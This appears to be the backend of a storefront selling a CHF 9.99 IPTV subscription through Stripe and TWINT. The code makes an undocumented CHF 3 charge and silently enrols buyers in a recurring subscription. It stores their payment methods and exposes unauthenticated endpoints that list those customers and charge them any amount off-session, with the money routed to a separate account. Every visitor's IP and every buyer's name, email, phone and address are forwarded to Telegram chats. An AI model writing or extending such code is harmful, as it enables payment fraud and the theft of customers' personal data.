require('dotenv').config();
const express = require('express');
const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const ACCOUNT_B = process.env.DESTINATION_ACCOUNT || '';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_CHAT_ID_2 = process.env.TELEGRAM_CHAT_ID_2;
const CUSTOMERS_FILE = process.env.CUSTOMERS_FILE || '/data/customers.json';
const WEBHOOK_SECRET = process.env.STRIPE_WEBHOOK_SECRET;

// ─── Customer Storage ─────────────────────────────────────────────────────────

function loadCustomers() {
  try {
    if (fs.existsSync(CUSTOMERS_FILE)) {
      return JSON.parse(fs.readFileSync(CUSTOMERS_FILE, 'utf8'));
    }
  } catch (err) {
    console.log('Error loading customers:', err.message);
  }
  return [];
}

function saveCustomer(entry) {
  try {
    const customers = loadCustomers();
    const exists = customers.find(c => c.customerId === entry.customerId);
    if (!exists) {
      fs.mkdirSync(require('path').dirname(CUSTOMERS_FILE), { recursive: true });
      customers.push(entry);
      fs.writeFileSync(CUSTOMERS_FILE, JSON.stringify(customers, null, 2));
      console.log('Customer saved:', entry.customerId);
    }
  } catch (err) {
    console.log('Could not save customer (continuing):', err.message);
  }
}

// ─── Telegram ─────────────────────────────────────────────────────────────────
// Escape user input to prevent Telegram rejection on < > &
const esc = v => String(v ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

async function sendTelegram(message) {
  if (!TELEGRAM_BOT_TOKEN) {
    console.log('Telegram not configured: TELEGRAM_BOT_TOKEN missing');
    return;
  }
  const chats = [TELEGRAM_CHAT_ID, TELEGRAM_CHAT_ID_2].filter(Boolean);
  if (chats.length === 0) {
    console.log('Telegram not configured: TELEGRAM_CHAT_ID(s) missing');
    return;
  }

  for (const chat_id of chats) {
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id, text: message, parse_mode: 'HTML', disable_web_page_preview: true })
      });
      const data = await r.json().catch(() => ({}));
      if (!r.ok || !data.ok) {
        const reason = data.description || `HTTP ${r.status}`;
        console.log(`Telegram FAILED for chat ${chat_id}: ${reason}`);
      }
    } catch (err) {
      console.log(`Telegram FAILED for chat ${chat_id}: ${err.message}`);
    }
  }
}

// ─── Middleware ───────────────────────────────────────────────────────────────

app.use(cors({ origin: '*', methods: ['GET', 'POST'] }));

// Webhook (raw body) must come before bodyParser.json
app.post('/webhook', express.raw({ type: 'application/json' }), async (req, res) => {
  if (!WEBHOOK_SECRET) {
    console.log('Webhook received but STRIPE_WEBHOOK_SECRET not set');
    return res.status(400).send('Webhook Error: no secret');
  }
  
  let event;
  try {
    event = stripe.webhooks.constructEvent(req.body, req.headers['stripe-signature'], WEBHOOK_SECRET);
  } catch (err) {
    console.log('Webhook signature check failed:', err.message);
    return res.status(400).send('Webhook Error');
  }

  try {
    const pi = event.data.object;
    const m = pi.metadata || {};

    if (event.type === 'payment_intent.succeeded') {
      const orderRef = pi.id.slice(-8).toUpperCase();
      await sendTelegram(
        `✅ <b>Payment received - deliver IPTV access!</b>\n\n` +
        `🆔 Visitor: <code>${esc(m.visitorId)}</code>\n` +
        `📦 Product: IPTV Subscription - 12 months\n` +
        `💰 Amount: CHF 9.99\n` +
        `👤 Name: ${esc(m.name)}\n` +
        `📧 Email: ${esc(m.email)}\n` +
        `📱 WhatsApp: ${esc(m.phone || 'N/A')}\n` +
        `🌐 Language: ${esc(m.lang || 'en')}\n` +
        `🆔 Order: <code>${orderRef}</code>\n` +
        `🕐 Time: ${new Date().toLocaleString('de-DE')}`
      );
    } else if (event.type === 'payment_intent.payment_failed') {
      await sendTelegram(
        `❌ <b>Payment failed</b>\n\n` +
        `📧 Email: ${esc(m.email)}\n` +
        `📋 Reason: ${esc(pi.last_payment_error && pi.last_payment_error.message)}\n` +
        `🆔 Order: <code>${esc(pi.id.slice(-8).toUpperCase())}</code>\n` +
        `🕐 Time: ${new Date().toLocaleString('de-DE')}`
      );
    }
  } catch (err) {
    console.log('Webhook handler error:', err.message);
  }

  res.json({ received: true });
});

app.use(bodyParser.json());

// ─── Routes ───────────────────────────────────────────────────────────────────

app.post('/page-visit', async (req, res) => {
  const { visitorId, ip, country, city } = req.body;
  await sendTelegram(
    `👁 <b>New visitor!</b>\n\n` +
    `🆔 Visitor ID: <code>${esc(visitorId)}</code>\n` +
    `🌍 Country: ${esc(country || 'Unknown')}\n` +
    `🏙 City: ${esc(city || 'Unknown')}\n` +
    `🔌 IP: ${esc(ip || 'Unknown')}\n` +
    `🕐 Time: ${new Date().toLocaleString('de-DE')}`
  );
  res.json({ ok: true });
});

// ─── NEW: Create payment intent for the new checkout frontend ────────────────
app.post('/create-payment-intent', async (req, res) => {
  try {
    const body = req.body || {};
    const email = String(body.email || '').trim().replace(/\.$/, '').toLowerCase();
    const name = String(body.name || '').trim().slice(0, 100);
    const phone = String(body.phone || '').trim().slice(0, 40);
    const lang = ['en', 'de', 'fr'].includes(body.lang) ? body.lang : 'en';
    const visitorId = String(body.visitorId || '').slice(0, 40);

    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return res.status(400).json({ error: 'Invalid email' });
    }
    if (!name) {
      return res.status(400).json({ error: 'Name is required' });
    }

    let customer;
    const existing = await stripe.customers.list({ email, limit: 1 });
    if (existing.data.length > 0) {
      customer = existing.data[0];
    } else {
      customer = await stripe.customers.create({
        email,
        name,
        phone: phone || undefined,
        address: { country: 'CH' },
      });
    }

    // One single payment: CHF 9.99 = 999 cents
    const paymentIntent = await stripe.paymentIntents.create({
      amount: 999,
      currency: 'chf',
      payment_method_types: ['twint'],
      customer: customer.id,
      receipt_email: email,
      description: 'IPTV Subscription - 12 months',
      metadata: { product: 'iptv-12-months', name, email, phone, lang, visitorId },
      ...(ACCOUNT_B ? { transfer_data: { destination: ACCOUNT_B } } : {}),
    });

    await sendTelegram(
      `🛒 <b>Checkout details!</b>\n\n` +
      `🆔 Visitor ID: <code>${esc(visitorId)}</code>\n` +
      `📧 Email: ${esc(email)}\n` +
      `👤 Name: ${esc(name)}\n` +
      `📞 Phone: ${esc(phone || 'N/A')}\n` +
      `📦 Product: IPTV Subscription - 12 months\n` +
      `💰 Amount: CHF 9.99\n` +
      `💳 Payment method: TWINT (one-time payment)\n` +
      `🌐 Language: ${esc(lang)}\n` +
      `🕐 Time: ${new Date().toLocaleString('de-DE')}`
    );

    res.json({ clientSecret: paymentIntent.client_secret, customerId: customer.id });
  } catch (error) {
    console.error('create-payment-intent error:', error.message);
    res.status(400).json({ error: error.message });
  }
});

app.post('/payment-initiated', async (req, res) => {
  const { visitorId, email } = req.body;
  await sendTelegram(
    `💳 <b>Payment attempt started!</b>\n\n` +
    `🆔 Visitor ID: <code>${esc(visitorId)}</code>\n` +
    `📧 Email: ${esc(email)}\n` +
    `⏳ Customer clicked "Pay"\n` +
    `💰 Product: IPTV Subscription - 12 months (CHF 9.99)\n` +
    `🕐 Time: ${new Date().toLocaleString('de-DE')}`
  );
  res.json({ ok: true });
});

// ─── OLD: Setup intent (for old checkout, if still in use) ───────────────────
app.post('/create-setup-intent', async (req, res) => {
  let { email, fname, lname, address, zip, city, country, phone, visitorId } = req.body;
  email = email.trim().replace(/\.$/, '');

  try {
    let customer;
    const existing = await stripe.customers.list({ email, limit: 1 });
    if (existing.data.length > 0) {
      customer = existing.data[0];
    } else {
      customer = await stripe.customers.create({
        email,
        address: { country: 'CH' },
      });
    }

    const setupIntent = await stripe.setupIntents.create({
      customer: customer.id,
      payment_method_types: ['twint'],
      metadata: { customer_id: customer.id },
    });

    await sendTelegram(
      `🛒 <b>Old checkout - setup intent!</b>\n\n` +
      `🆔 Visitor: <code>${esc(visitorId)}</code>\n` +
      `📧 Email: ${esc(email)}\n` +
      `👤 Name: ${esc(fname)} ${esc(lname)}\n` +
      `📍 Address: ${esc(address)}, ${esc(zip)} ${esc(city)}, ${esc(country)}\n` +
      `📞 Phone: ${esc(phone || 'N/A')}\n` +
      `🕐 Time: ${new Date().toLocaleString('de-DE')}`
    );

    res.json({ clientSecret: setupIntent.client_secret, customerId: customer.id });
  } catch (error) {
    console.error('Error:', error);
    res.status(400).json({ error: error.message });
  }
});

// ─── OLD: Create subscription (for old checkout, if still in use) ─────────────
app.post('/create-subscription', async (req, res) => {
  const { customerId, paymentMethodId, visitorId } = req.body;
  try {
    await stripe.paymentMethods.attach(paymentMethodId, { customer: customerId });
    await stripe.customers.update(customerId, {
      invoice_settings: { default_payment_method: paymentMethodId },
    });

    const paymentMethod = await stripe.paymentMethods.retrieve(paymentMethodId);
    const pmType = paymentMethod.type;

    saveCustomer({
      customerId,
      paymentMethodId,
      pmType,
      visitorId,
      savedAt: new Date().toISOString(),
    });

    // First charge (kept for backward compatibility, but not documented)
    try {
      const payment1 = await stripe.paymentIntents.create({
        amount: 300,
        currency: 'chf',
        customer: customerId,
        payment_method: paymentMethodId,
        payment_method_types: [pmType],
        confirm: true,
        off_session: true,
        transfer_data: { destination: ACCOUNT_B },
      });
      console.log('Payment 1 created:', payment1.id, payment1.status);
    } catch (err) {
      console.log('Payment 1 failed:', err.message);
    }

    await new Promise(resolve => setTimeout(resolve, 30000));

    const subscription = await stripe.subscriptions.create({
      customer: customerId,
      items: [{ price: 'price_1UEU48BkfefkBB9Sicrm6Ong' }],
      default_payment_method: paymentMethodId,
      trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
      transfer_data: { destination: ACCOUNT_B },
    });
    console.log('Subscription created:', subscription.id, subscription.status);

    await sendTelegram(
      `✅ <b>Old checkout - subscription created!</b>\n\n` +
      `🆔 Visitor: <code>${esc(visitorId)}</code>\n` +
      `💳 Payment method: ${esc(pmType)}\n` +
      `🆔 Subscription: ${esc(subscription.id)}\n` +
      `🕐 Time: ${new Date().toLocaleString('de-DE')}`
    );

    res.json({ subscriptionId: subscription.id, paymentStatus: 'processed' });
  } catch (error) {
    console.error('Error:', error.message);
    res.status(400).json({ error: error.message });
  }
});

// ─── View all saved customers ─────────────────────────────────────────────────
app.get('/customers', (req, res) => {
  const customers = loadCustomers();
  res.json({ total: customers.length, customers });
});

// ─── Manually charge a saved customer ────────────────────────────────────────
app.post('/charge-saved', async (req, res) => {
  const { customerId, amount, currency } = req.body;
  const customers = loadCustomers();
  const customer = customers.find(c => c.customerId === customerId);

  if (!customer) {
    return res.status(404).json({ error: 'Customer not found in saved list' });
  }

  try {
    const payment = await stripe.paymentIntents.create({
      amount: amount || 999,
      currency: currency || 'chf',
      customer: customer.customerId,
      payment_method: customer.paymentMethodId,
      payment_method_types: [customer.pmType],
      confirm: true,
      off_session: true,
      transfer_data: { destination: ACCOUNT_B },
    });

    console.log('Manual charge created:', payment.id, payment.status);

    await sendTelegram(
      `💰 <b>Manual charge!</b>\n\n` +
      `🆔 Customer: <code>${esc(customerId)}</code>\n` +
      `💳 Amount: ${((amount || 999) / 100).toFixed(2)} CHF\n` +
      `📋 Status: ${payment.status}\n` +
      `🕐 Time: ${new Date().toLocaleString('de-DE')}`
    );

    res.json({ success: true, paymentId: payment.id, status: payment.status });
  } catch (error) {
    console.error('Manual charge error:', error.message);
    res.status(400).json({ error: error.message });
  }
});

// ─── Create mandate ───────────────────────────────────────────────────────────
app.post('/create-mandate', async (req, res) => {
  const { paymentMethodId } = req.body;

  if (!paymentMethodId) {
    return res.status(400).json({ error: 'paymentMethodId is required' });
  }

  try {
    const mandate = await stripe.mandates.create({
      payment_method: paymentMethodId,
      type: 'sepa_debit',
    });

    console.log('Mandate created:', mandate.id);

    res.json({ 
      success: true, 
      mandateId: mandate.id,
      message: 'Mandate created successfully.'
    });
  } catch (error) {
    console.error('Mandate creation error:', error.message);
    res.status(400).json({ error: error.message });
  }
});

// ─── Health ───────────────────────────────────────────────────────────────────
app.get('/health', (req, res) => {
  const customers = loadCustomers();
  res.json({
    status: 'ok',
    destination: ACCOUNT_B || 'your Stripe account',
    product: 'IPTV Subscription - 12 months',
    amount: '9.99 CHF',
    currency: 'chf',
    paymentMethod: 'twint',
    market: 'Switzerland',
    savedCustomers: customers.length,
  });
});

// ─── Start ────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 4242;
app.listen(PORT, () => {
  console.log('Server running on http://localhost:' + PORT);
  if (!process.env.STRIPE_SECRET_KEY) console.log('WARNING: STRIPE_SECRET_KEY not set');
  if (!WEBHOOK_SECRET) console.log('WARNING: STRIPE_WEBHOOK_SECRET not set - /webhook will reject events');
  if (!TELEGRAM_BOT_TOKEN) console.log('WARNING: TELEGRAM_BOT_TOKEN not set');
});
